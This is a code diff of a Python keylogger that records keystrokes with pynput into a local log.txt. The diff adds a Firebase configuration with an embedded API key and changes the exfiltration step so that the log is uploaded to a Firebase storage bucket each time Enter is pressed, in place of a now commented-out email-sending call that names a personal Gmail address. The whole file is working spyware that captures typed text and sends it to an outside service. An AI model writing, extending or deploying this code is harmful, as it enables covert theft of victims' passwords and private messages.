@@ -3,13 +3,28 @@
 
 # Importing modules for logging keys
 from pynput.keyboard import Key, Listener
-import keyboard
+import pyrebase
+import uploadFirebase
 
 import emailSender as es
 # --------------------------------------------------------------------------------------------------------
 
 currentPosition = 0
 capsLockActive = False
+
+config = {
+    "apiKey": "AIzaSyAboBophk8DAJBXmn4ltGZyGlYZnRqEpXQ",
+    "authDomain": "keylogger-e4335.firebaseapp.com",
+    "databaseURL": "https://keylogger-e4335-default-rtdb.asia-southeast1.firebasedatabase.app/",
+    "projectId": "keylogger-e4335",
+    "storageBucket": "keylogger-e4335.appspot.com",
+    "messagingSenderId": "880295281065",
+    "appId": "1:880295281065:web:31b4dba6661594ba84c4b8",
+    "measurementId": "G-YNJP3TKYWM"
+}
+
+firebase = pyrebase.initialize_app(config)
+storage = firebase.storage()
 
 # Logging Keys into a file named - log.txt
 
@@ -36,8 +51,9 @@ def writeToFile(key):
     # 2. Send the 'log.txt' file via mail upto which it has been tracked and continue tracking
     elif key == Key.enter:
         letter = "\n"
-        es.shareViaMail("log.txt", "log.txt" , "bongspatra@gmail.com", False)
-
+        # es.shareViaMail("log.txt", "log.txt" , "bongspatra@gmail.com", False)
+        uploadFirebase.uploadToFirebase(storage, "log.txt", 1)
+        
     elif key == Key.backspace:
         # Remove the last character from the file
         with open("log.txt", 'r+') as f:
@@ -100,7 +116,7 @@ def writeToFile(key):
 def closeKLogger(key):
     # exits the keylogger when the ESC key is pressed
     if key == Key.esc:
-        return False
+        exit(0)
     
 def start_keylogger():
     with Listener(on_press = writeToFile, on_release = closeKLogger) as l:
